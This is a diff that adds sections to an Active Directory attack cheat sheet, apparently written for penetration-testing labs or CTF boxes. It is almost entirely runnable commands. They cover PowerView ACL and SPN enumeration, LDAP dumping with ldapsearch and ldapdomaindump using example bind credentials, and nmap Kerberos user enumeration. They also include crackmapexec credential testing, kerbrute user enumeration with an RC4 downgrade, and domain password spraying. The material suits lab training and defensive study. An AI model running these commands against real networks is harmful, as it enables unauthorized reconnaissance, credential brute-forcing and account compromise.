@@ -202,6 +202,80 @@ $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
 $("$env:UserDomain\$env:Username")) {$_}}
 ```
 
+#### Enumerate users and permissions
+
+```powershell
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
+```
+
+*Verify if the user already has a SPN :*
+> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
+```powershell
+Get-DomainUser -Identity supportuser | select serviceprincipalname
+```
+> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :
+```powershell
+Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
+```
+
+### LDAP Enumeration 
+```powershell
+ldapsearch -x -h 10.10.10.x -p 389 -s base namingcontexts
+ldapsearch -h 10.10.10.x -p 389 -x -b "dc=boxname,dc=local"
+```
+*find service accounts*
+```powershell
+ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=box,dc=local" | grep "service"
+```
+
+*Enumeration with ldapsearch as authenticated user*
+```powershell
+ldapsearch -x -h ldap.megacorp.corp -w '$pass'     
+ldapsearch -x -h 10.10.131.164 -p 389 -b "dc=megacorp,dc=corp" -D 'john@megacorp.corp' -w 'vs2k6!'
+ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -s base namingcontexts 
+ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -b 'dc=megacorp'
+```
+*Enumeration with ldapdomaindump (authenticated) with nice output*
+```
+ldapdomaindump 10.10.197.117 -u 'megacorp.corp\john' -p '$pass' --no-json --no-grep
+```
+*Enumeration with nmap scripts*
+```bash
+nmap -p 389 --script ldap-search 10.10.10.x
+nmap -n -sV --script "ldap*" -p 389 10.10.10.x
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='MEGACORP.CORP',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.13.100
+```
+
+### SMB Enumeration 
+
+*enumeration with crackmapexec as unauthenticated*
+```bash
+crackmapexec smb 10.10.10.x --pass-pol -u '' -p ''
+```
+*enumeration with crackmapexec (authenticated)*
+crackmapexec smb 10.10.11.129 --pass-pol -u usernames.txt -p 'IsolationIsKey?' --continue-on-sucess
+crackmapexec smb 10.10.11.129 --pass-pol -u xlsx_users -p xlsx_pass --continue-on-sucess         # using lists both for users and passwords
+
+*enumeration with kerbrute, against Kerberos pre-auth bruteforcing:*
+```bash
+/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.local --dc 10.10.13.100 -o kerbrute.out users.txt
+/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.htb --dc 10.10.13.100 -o kerbrute.out users.lst --downgrade
+```
+> by default, kerbrute uses the most secure mode (18 = sha1) to pull some hash. Using the downgrade option we can pull the deprecaded encryption type version (23 = rc4hmac). Or use getNPusers to get some hash instead, it's safer! 
+
+*provide a password or a list of passwords to test against users*
+```bash
+crackmapexec smb 10.10.13.100 --pass-pol -u users.lst -p password_list
+```
+*Enumerate some users*
+```bash
+crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
+```
+### Password Spraying on the domain 
+```bash
+/opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
+```
+
 ## Domain Privilege Escalation
 
 ### Kerberoasting
